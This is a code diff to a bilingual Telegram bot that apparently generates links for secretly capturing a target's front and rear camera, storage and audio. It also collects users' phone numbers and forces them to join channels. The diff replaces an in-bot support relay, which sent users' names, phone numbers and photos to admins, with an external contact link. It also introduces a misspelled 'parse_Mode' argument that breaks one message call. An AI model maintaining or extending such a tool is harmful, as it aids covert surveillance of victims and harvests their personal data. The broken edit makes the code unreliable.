@@ -47,8 +47,6 @@ LANGUAGES = {
         'join_check': "❌ **عضویت اجباری!**\n\nبرای استفاده از ربات، لطفاً ابتدا در تمامی کانال‌ها و گروه‌های زیر عضو شوید و سپس روی دکمه «عضو شدم ✅» کلیک کنید:",
         'join_btn': "عضویت در 🚀",
         'check_join_btn': "عضو شدم ✅",
-        'support_prompt': "💬 **ارسال پیام به پشتیبانی:**\n\nلطفاً پیام، سوال یا مشکل خود را ارسال کنید تا به دست تیم مدیریت برسد:",
-        'support_sent': "✅ پیام شما با موفقیت برای پشتیبانی ارسال شد. منتظر پاسخ بمانید."
     },
     'en': {
         'welcome_title': "⚠️ **[ SYSTEM ACCESSED ]** ⚠️",
@@ -66,8 +64,6 @@ LANGUAGES = {
         'join_check': "❌ **Membership Required!**\n\nTo use the bot, please join all channels/groups below and then click 'Joined ✅':",
         'join_btn': "Join 🚀",
         'check_join_btn': "Joined ✅",
-        'support_prompt': "💬 **Send message to support:**\n\nPlease send your message or question so it reaches the management team:",
-        'support_sent': "✅ Your message has been successfully sent to support. Please wait for a reply."
     }
 }
 
@@ -323,14 +319,6 @@ def callback_query(call):
         bot.send_message(chat_id=user_id, text=lang_dict['phone_request'], reply_markup=markup)
         return
 
-    if data == "support_btn":
-        lang = user_languages.get(user_id, 'prs')
-        lang_dict = LANGUAGES[lang]
-        bot.answer_callback_query(call.id)
-        bot.send_message(user_id, lang_dict['support_prompt'], parse_mode="Markdown")
-        admin_states[user_id] = {"step": "waiting_support"}
-        return
-
     valid_modules = {
         "front": "📸 لینک دوربین جلو",
         "back": "📷 لینک دوربین عقب",
@@ -406,7 +394,7 @@ def handle_contact(message):
         types.InlineKeyboardButton(lang_dict['btn_all'], callback_data="all"),
         types.InlineKeyboardButton(lang_dict['btn_storage'], callback_data="storage"),
         types.InlineKeyboardButton(lang_dict['btn_audio'], callback_data="audio"),
-        types.InlineKeyboardButton(lang_dict['btn_support'], callback_data="support_btn")
+        types.InlineKeyboardButton(lang_dict['btn_support'], url="https://t.me/ID_KING_SAHIL")
     )
     
     caption = f"{lang_dict['welcome_title']}\n\n{lang_dict['welcome_msg'].format(first_name=first_name, user_id=user_id)}"
@@ -416,7 +404,7 @@ def handle_contact(message):
     except:
         bot.send_message(chat_id=user_id, text=caption, parse_mode="Markdown", reply_markup=markup)
 
-# مدیریت پیام‌های متنی و پشتیبانی با ارسال کامل مشخصات و قابلیت ریپلای
+# مدیریت پیام‌های متنی (ادمین‌ها)
 @bot.message_handler(content_types=['text', 'photo', 'video', 'document', 'audio', 'voice'])
 def handle_all_messages(message):
     user_id = message.from_user.id
@@ -478,46 +466,8 @@ def handle_all_messages(message):
                     time.sleep(0.05)
                 except:
                     fail_count += 1
-            bot.send_message(user_id, f"✅ عملیات همگانی به پایان رسید.\nموفق: `{success_count}` | ناموفق: `{fail_count}`", parse_mode="Markdown")
+            bot.send_message(user_id, f"✅ عملیات همگانی به پایان رسید.\nموفق: `{success_count}` | ناموفق: `{fail_count}`", parse_Mode="Markdown")
             return
-
-    if user_id in admin_states and admin_states[user_id].get("step") == "waiting_support":
-        del admin_states[user_id]
-        
-        user_text = message.text or message.caption or "فایل/رسانه"
-        first_name = message.from_user.first_name or "بدون نام"
-        username = f"@{message.from_user.username}" if message.from_user.username else "ندارد"
-        phone = user_phones.get(user_id, "ثبت نشده (اشتراک‌گذاری نکرده)")
-        
-        support_report = (
-            f"📩 **[ پیام جدید پشتیبانی ]**\n\n"
-            f"👤 نام: `{first_name}`\n"
-            f"🆔 آیدی عددی: `{user_id}`\n"
-            f"🌐 نام کاربری: `{username}`\n"
-            f"📱 شماره تلفن: `{phone}`\n\n"
-            f"💬 **متن پیام:**\n`{user_text}`"
-        )
-        
-        user_photos = bot.get_user_profile_photos(user_id, limit=1)
-        
-        for admin_id in ADMINS:
-            try:
-                if user_photos.total_count > 0:
-                    file_id = user_photos.photos[0][0].file_id
-                    bot.send_photo(chat_id=admin_id, photo=file_id, caption=support_report, parse_mode="Markdown")
-                else:
-                    bot.send_message(chat_id=admin_id, text=support_report, parse_mode="Markdown")
-            except Exception as e:
-                print(f"خطا در ارسال پیام پشتیبانی به ادمین {admin_id}: {e}")
-                try:
-                    bot.send_message(admin_id, support_report, parse_mode="Markdown")
-                except:
-                    pass
-                
-        lang = user_languages.get(user_id, 'prs')
-        lang_dict = LANGUAGES[lang]
-        bot.send_message(user_id, lang_dict['support_sent'])
-        return
 
 if __name__ == "__main__":
     print("ربات با موفقیت به‌روزرسانی شد و آماده کار است...")
